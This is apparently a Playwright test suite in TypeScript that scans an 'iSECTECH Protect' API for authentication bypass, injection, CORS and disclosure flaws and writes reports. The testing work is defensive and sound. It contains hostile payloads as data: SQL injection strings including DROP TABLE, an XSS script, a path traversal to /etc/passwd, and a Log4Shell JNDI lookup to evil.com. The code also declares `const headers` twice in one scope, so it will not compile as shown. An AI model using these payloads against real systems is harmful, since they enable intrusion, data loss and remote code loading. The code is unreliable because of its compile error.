/**
 * API Security Testing Suite
 * iSECTECH Protect - Comprehensive API Security Validation
 */

import { test, expect, APIRequestContext } from '@playwright/test';
import fs from 'fs';
import path from 'path';

interface APISecurityTestResult {
  endpoint: string;
  method: string;
  tests: {
    name: string;
    passed: boolean;
    severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    details: string;
    remediation: string;
    httpStatus?: number;
    responseTime?: number;
  }[];
  overallScore: number;
  secure: boolean;
}

class APISecurityTester {
  private baseURL: string;
  private authToken: string = '';

  constructor(baseURL: string = 'http://localhost:3000') {
    this.baseURL = baseURL;
  }

  async authenticate(request: APIRequestContext): Promise<void> {
    const loginResponse = await request.post(`${this.baseURL}/api/auth/login`, {
      data: {
        email: 'test@isectech.com',
        password: 'TestPassword123!',
      },
    });

    const loginData = await loginResponse.json();
    this.authToken = loginData.token || loginData.accessToken || '';
  }

  async testAPIEndpointSecurity(
    request: APIRequestContext,
    endpoint: string,
    method: string,
    requiresAuth: boolean = true
  ): Promise<APISecurityTestResult> {
    const tests = [];
    const fullUrl = `${this.baseURL}${endpoint}`;

    // Test 1: Authentication bypass
    let authBypassTest = {
      name: 'Authentication Bypass Protection',
      passed: true,
      severity: 'CRITICAL' as const,
      details: 'Authentication properly enforced',
      remediation: 'Continue enforcing authentication on protected endpoints',
      httpStatus: 401,
    };

    if (requiresAuth) {
      const unauthResponse = await request.fetch(fullUrl, { method });
      authBypassTest.httpStatus = unauthResponse.status();
      
      if (unauthResponse.status() === 200) {
        authBypassTest.passed = false;
        authBypassTest.details = 'Endpoint accessible without authentication';
        authBypassTest.remediation = 'Implement proper authentication checks on all protected endpoints';
      } else if (unauthResponse.status() !== 401 && unauthResponse.status() !== 403) {
        authBypassTest.passed = false;
        authBypassTest.severity = 'MEDIUM';
        authBypassTest.details = `Unexpected response code: ${unauthResponse.status()}`;
        authBypassTest.remediation = 'Return proper 401/403 status codes for unauthenticated requests';
      }
    }
    tests.push(authBypassTest);

    // Test 2: SQL Injection via API
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
    ];

    let sqlInjectionPassed = true;
    let sqlInjectionDetails = 'No SQL injection vulnerabilities detected';

    for (const payload of sqlPayloads) {
      const testUrl = endpoint.includes('?') 
        ? `${fullUrl}&test=${encodeURIComponent(payload)}`
        : `${fullUrl}?test=${encodeURIComponent(payload)}`;
      
      const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};
      const sqlResponse = await request.fetch(testUrl, { method, headers });
      
      const responseText = await sqlResponse.text().catch(() => '');
      const hasSQLError = /SQL|syntax|mysql|postgresql|oracle/i.test(responseText);
      
      if (hasSQLError || sqlResponse.status() === 500) {
        sqlInjectionPassed = false;
        sqlInjectionDetails = `SQL injection vulnerability with payload: ${payload}`;
        break;
      }
    }

    tests.push({
      name: 'SQL Injection Protection',
      passed: sqlInjectionPassed,
      severity: sqlInjectionPassed ? 'LOW' : 'CRITICAL',
      details: sqlInjectionDetails,
      remediation: 'Use parameterized queries and proper input validation',
    });

    // Test 3: HTTP Method Override
    const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
    let methodOverridePassed = true;
    let allowedMethods = [];

    for (const testMethod of httpMethods) {
      if (testMethod === method) continue;
      
      const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};
      const methodResponse = await request.fetch(fullUrl, { 
        method: testMethod, 
        headers,
        failOnStatusCode: false,
      });
      
      if (methodResponse.status() === 200) {
        allowedMethods.push(testMethod);
        if (!['GET', 'POST', 'PUT', 'DELETE'].includes(testMethod)) {
          methodOverridePassed = false;
        }
      }
    }

    tests.push({
      name: 'HTTP Method Security',
      passed: methodOverridePassed,
      severity: methodOverridePassed ? 'LOW' : 'MEDIUM',
      details: methodOverridePassed 
        ? 'Only expected HTTP methods allowed' 
        : `Unexpected methods allowed: ${allowedMethods.join(', ')}`,
      remediation: 'Restrict HTTP methods to only those required for the endpoint',
    });

    // Test 4: Rate Limiting
    let rateLimitPassed = false;
    let rateLimitStatus = 0;
    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};

    for (let i = 0; i < 50; i++) {
      const rateLimitResponse = await request.fetch(fullUrl, { method, headers, failOnStatusCode: false });
      if (rateLimitResponse.status() === 429) {
        rateLimitPassed = true;
        rateLimitStatus = 429;
        break;
      }
      if (i > 25 && rateLimitResponse.status() !== 200) {
        // Allow for other error codes after many requests
        rateLimitPassed = true;
        rateLimitStatus = rateLimitResponse.status();
        break;
      }
    }

    tests.push({
      name: 'Rate Limiting Protection',
      passed: rateLimitPassed,
      severity: rateLimitPassed ? 'LOW' : 'MEDIUM',
      details: rateLimitPassed 
        ? `Rate limiting active (HTTP ${rateLimitStatus})` 
        : 'No rate limiting detected after 50 requests',
      remediation: 'Implement rate limiting to prevent abuse',
      httpStatus: rateLimitStatus,
    });

    // Test 5: Input Validation
    const maliciousPayloads = [
      '<script>alert("xss")</script>',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
    ];

    let inputValidationPassed = true;
    let inputValidationDetails = 'Input validation working properly';

    for (const payload of maliciousPayloads) {
      let testData;
      if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
        testData = { test: payload, title: payload, description: payload };
      }
      
      const testHeaders = {
        'Content-Type': 'application/json',
        ...(this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {}),
      };

      const validationResponse = await request.fetch(fullUrl, {
        method,
        headers: testHeaders,
        data: testData,
        failOnStatusCode: false,
      });

      const responseText = await validationResponse.text().catch(() => '');
      
      // Check if malicious payload is reflected unescaped
      if (responseText.includes(payload) && !responseText.includes('&lt;script&gt;')) {
        inputValidationPassed = false;
        inputValidationDetails = `Malicious payload reflected: ${payload}`;
        break;
      }
      
      // Check for template injection
      if (payload === '{{7*7}}' && responseText.includes('49')) {
        inputValidationPassed = false;
        inputValidationDetails = 'Template injection vulnerability detected';
        break;
      }
    }

    tests.push({
      name: 'Input Validation & Sanitization',
      passed: inputValidationPassed,
      severity: inputValidationPassed ? 'LOW' : 'HIGH',
      details: inputValidationDetails,
      remediation: 'Implement comprehensive input validation and output encoding',
    });

    // Test 6: Response Information Disclosure
    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};
    const infoResponse = await request.fetch(fullUrl, { method, headers, failOnStatusCode: false });
    const responseHeaders = infoResponse.headers();
    const responseText = await infoResponse.text().catch(() => '');

    let infoDisclosurePassed = true;
    let disclosureIssues = [];

    // Check for sensitive headers
    const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version'];
    sensitiveHeaders.forEach(header => {
      if (responseHeaders[header]) {
        disclosureIssues.push(`${header}: ${responseHeaders[header]}`);
        infoDisclosurePassed = false;
      }
    });

    // Check for stack traces in responses
    if (/at\s+.*\s+\(.*:\d+:\d+\)|Exception|Error:/.test(responseText)) {
      disclosureIssues.push('Stack trace or detailed error information exposed');
      infoDisclosurePassed = false;
    }

    tests.push({
      name: 'Information Disclosure Prevention',
      passed: infoDisclosurePassed,
      severity: infoDisclosurePassed ? 'LOW' : 'MEDIUM',
      details: infoDisclosurePassed 
        ? 'No sensitive information disclosed' 
        : `Information disclosed: ${disclosureIssues.join(', ')}`,
      remediation: 'Remove sensitive headers and implement generic error messages',
      httpStatus: infoResponse.status(),
    });

    // Test 7: CORS Configuration
    const corsResponse = await request.fetch(fullUrl, {
      method: 'OPTIONS',
      headers: {
        'Origin': 'https://malicious-site.com',
        'Access-Control-Request-Method': method,
      },
      failOnStatusCode: false,
    });

    const corsHeaders = corsResponse.headers();
    let corsPassed = true;
    let corsDetails = 'CORS properly configured';

    if (corsHeaders['access-control-allow-origin'] === '*') {
      corsPassed = false;
      corsDetails = 'CORS allows all origins (*)';
    } else if (corsHeaders['access-control-allow-origin'] === 'https://malicious-site.com') {
      corsPassed = false;
      corsDetails = 'CORS allows malicious origins';
    }

    tests.push({
      name: 'CORS Configuration Security',
      passed: corsPassed,
      severity: corsPassed ? 'LOW' : 'MEDIUM',
      details: corsDetails,
      remediation: 'Configure CORS to only allow trusted origins',
      httpStatus: corsResponse.status(),
    });

    // Calculate overall score
    const passedTests = tests.filter(t => t.passed).length;
    const overallScore = Math.round((passedTests / tests.length) * 100);
    const secure = overallScore >= 85 && !tests.some(t => !t.passed && t.severity === 'CRITICAL');

    return {
      endpoint,
      method,
      tests,
      overallScore,
      secure,
    };
  }

  async performComprehensiveAPISecurityScan(request: APIRequestContext): Promise<APISecurityTestResult[]> {
    console.log('🔍 Starting comprehensive API security scan...');

    await this.authenticate(request);

    const endpoints = [
      { path: '/api/auth/login', method: 'POST', requiresAuth: false },
      { path: '/api/auth/logout', method: 'POST', requiresAuth: true },
      { path: '/api/alerts', method: 'GET', requiresAuth: true },
      { path: '/api/alerts', method: 'POST', requiresAuth: true },
      { path: '/api/alerts/1', method: 'GET', requiresAuth: true },
      { path: '/api/alerts/1', method: 'PUT', requiresAuth: true },
      { path: '/api/alerts/1', method: 'DELETE', requiresAuth: true },
      { path: '/api/threats', method: 'GET', requiresAuth: true },
      { path: '/api/search', method: 'GET', requiresAuth: true },
      { path: '/api/user/profile', method: 'GET', requiresAuth: true },
      { path: '/api/admin/users', method: 'GET', requiresAuth: true },
    ];

    const results = [];
    
    for (const { path, method, requiresAuth } of endpoints) {
      console.log(`Testing ${method} ${path}...`);
      try {
        const result = await this.testAPIEndpointSecurity(request, path, method, requiresAuth);
        results.push(result);
      } catch (error) {
        console.error(`Error testing ${method} ${path}:`, error);
        results.push({
          endpoint: path,
          method,
          tests: [{
            name: 'Endpoint Accessibility',
            passed: false,
            severity: 'HIGH' as const,
            details: `Error testing endpoint: ${error}`,
            remediation: 'Investigate endpoint connectivity and configuration',
          }],
          overallScore: 0,
          secure: false,
        });
      }
    }

    return results;
  }
}

test.describe('🔒 API Security Testing Suite', () => {
  let apiTester: APISecurityTester;

  test.beforeEach(() => {
    apiTester = new APISecurityTester();
  });

  test('should secure authentication endpoints', async ({ request }) => {
    const result = await apiTester.testAPIEndpointSecurity(request, '/api/auth/login', 'POST', false);
    
    expect(result.secure).toBe(true);
    expect(result.overallScore).toBeGreaterThanOrEqual(85);
    
    const criticalFailures = result.tests.filter(t => !t.passed && t.severity === 'CRITICAL');
    expect(criticalFailures.length).toBe(0);
    
    console.log(`🔒 Auth Login Security: ${result.overallScore}% (${result.secure ? 'SECURE' : 'INSECURE'})`);
  });

  test('should secure alert management endpoints', async ({ request }) => {
    const endpoints = [
      { path: '/api/alerts', method: 'GET' },
      { path: '/api/alerts', method: 'POST' },
      { path: '/api/alerts/1', method: 'PUT' },
    ];

    for (const { path, method } of endpoints) {
      const result = await apiTester.testAPIEndpointSecurity(request, path, method);
      
      expect(result.secure).toBe(true);
      expect(result.overallScore).toBeGreaterThanOrEqual(80);
      
      const criticalFailures = result.tests.filter(t => !t.passed && t.severity === 'CRITICAL');
      expect(criticalFailures.length).toBe(0);
      
      console.log(`🚨 ${method} ${path}: ${result.overallScore}% (${result.secure ? 'SECURE' : 'INSECURE'})`);
    }
  });

  test('should secure administrative endpoints', async ({ request }) => {
    const result = await apiTester.testAPIEndpointSecurity(request, '/api/admin/users', 'GET');
    
    expect(result.secure).toBe(true);
    expect(result.overallScore).toBeGreaterThanOrEqual(85);
    
    // Admin endpoints should have stricter security
    const authTest = result.tests.find(t => t.name === 'Authentication Bypass Protection');
    expect(authTest?.passed).toBe(true);
    
    console.log(`👑 Admin Users API: ${result.overallScore}% (${result.secure ? 'SECURE' : 'INSECURE'})`);
  });

  test('should secure search and query endpoints', async ({ request }) => {
    const result = await apiTester.testAPIEndpointSecurity(request, '/api/search', 'GET');
    
    expect(result.secure).toBe(true);
    expect(result.overallScore).toBeGreaterThanOrEqual(80);
    
    // Search endpoints are high risk for injection
    const sqlTest = result.tests.find(t => t.name === 'SQL Injection Protection');
    expect(sqlTest?.passed).toBe(true);
    
    const inputTest = result.tests.find(t => t.name === 'Input Validation & Sanitization');
    expect(inputTest?.passed).toBe(true);
    
    console.log(`🔍 Search API: ${result.overallScore}% (${result.secure ? 'SECURE' : 'INSECURE'})`);
  });

  test('should perform comprehensive API security assessment', async ({ request }) => {
    const results = await apiTester.performComprehensiveAPISecurityScan(request);
    
    // Calculate overall API security score
    const totalScore = results.reduce((sum, result) => sum + result.overallScore, 0);
    const averageScore = Math.round(totalScore / results.length);
    const secureEndpoints = results.filter(r => r.secure).length;
    const overallSecure = secureEndpoints === results.length;
    
    // Assert overall API security
    expect(overallSecure).toBe(true);
    expect(averageScore).toBeGreaterThanOrEqual(80);
    
    // Check for critical vulnerabilities across all endpoints
    const allCriticalIssues = results.reduce((issues, result) => {
      return issues.concat(result.tests.filter(t => !t.passed && t.severity === 'CRITICAL'));
    }, []);
    
    expect(allCriticalIssues.length).toBe(0);
    
    // Generate comprehensive report
    const report = {
      timestamp: new Date().toISOString(),
      overallScore: averageScore,
      overallSecure,
      secureEndpoints,
      totalEndpoints: results.length,
      results,
      summary: {
        critical: results.reduce((sum, r) => sum + r.tests.filter(t => !t.passed && t.severity === 'CRITICAL').length, 0),
        high: results.reduce((sum, r) => sum + r.tests.filter(t => !t.passed && t.severity === 'HIGH').length, 0),
        medium: results.reduce((sum, r) => sum + r.tests.filter(t => !t.passed && t.severity === 'MEDIUM').length, 0),
        low: results.reduce((sum, r) => sum + r.tests.filter(t => !t.passed && t.severity === 'LOW').length, 0),
      },
      topVulnerabilities: allCriticalIssues.concat(
        results.reduce((issues, result) => {
          return issues.concat(result.tests.filter(t => !t.passed && t.severity === 'HIGH'));
        }, [])
      ).slice(0, 10),
    };
    
    // Save detailed report
    const reportPath = path.join(__dirname, '../../test-results/api-security-report.json');
    fs.mkdirSync(path.dirname(reportPath), { recursive: true });
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
    
    // Generate markdown report
    let markdown = `# API Security Assessment Report\n\n`;
    markdown += `**Generated:** ${report.timestamp}\n`;
    markdown += `**Overall Score:** ${report.overallScore}%\n`;
    markdown += `**Security Status:** ${report.overallSecure ? '✅ SECURE' : '❌ INSECURE'}\n`;
    markdown += `**Secure Endpoints:** ${report.secureEndpoints}/${report.totalEndpoints}\n\n`;
    
    markdown += `## Summary\n`;
    markdown += `- **Critical Issues:** ${report.summary.critical}\n`;
    markdown += `- **High Issues:** ${report.summary.high}\n`;
    markdown += `- **Medium Issues:** ${report.summary.medium}\n`;
    markdown += `- **Low Issues:** ${report.summary.low}\n\n`;
    
    if (report.topVulnerabilities.length > 0) {
      markdown += `## Top Vulnerabilities\n\n`;
      report.topVulnerabilities.forEach((vuln, index) => {
        markdown += `${index + 1}. **[${vuln.severity}]** ${vuln.name}\n`;
        markdown += `   - **Details:** ${vuln.details}\n`;
        markdown += `   - **Remediation:** ${vuln.remediation}\n\n`;
      });
    }
    
    markdown += `## Detailed Results\n\n`;
    results.forEach(result => {
      const status = result.secure ? '✅' : '❌';
      markdown += `### ${status} ${result.method} ${result.endpoint}\n`;
      markdown += `**Score:** ${result.overallScore}%\n\n`;
      
      result.tests.forEach(test => {
        const testStatus = test.passed ? '✅' : '❌';
        markdown += `- ${testStatus} **${test.name}** (${test.severity}): ${test.details}\n`;
        if (!test.passed) {
          markdown += `  - *Remediation:* ${test.remediation}\n`;
        }
      });
      markdown += `\n`;
    });
    
    const markdownPath = path.join(__dirname, '../../test-results/api-security-report.md');
    fs.writeFileSync(markdownPath, markdown);
    
    console.log('\n🛡️ API Security Assessment Complete:');
    console.log(`  Overall Score: ${averageScore}%`);
    console.log(`  Security Status: ${overallSecure ? 'SECURE' : 'INSECURE'}`);
    console.log(`  Secure Endpoints: ${secureEndpoints}/${results.length}`);
    console.log(`\n📊 Issue Summary:`);
    console.log(`  Critical: ${report.summary.critical}`);
    console.log(`  High: ${report.summary.high}`);
    console.log(`  Medium: ${report.summary.medium}`);
    console.log(`  Low: ${report.summary.low}`);
    
    results.forEach(result => {
      const status = result.secure ? '✅' : '❌';
      console.log(`  ${status} ${result.method} ${result.endpoint}: ${result.overallScore}%`);
    });
    
    console.log(`\n📋 Reports saved:`);
    console.log(`  JSON: ${reportPath}`);
    console.log(`  Markdown: ${markdownPath}`);
  }, 300000); // 5 minute timeout
});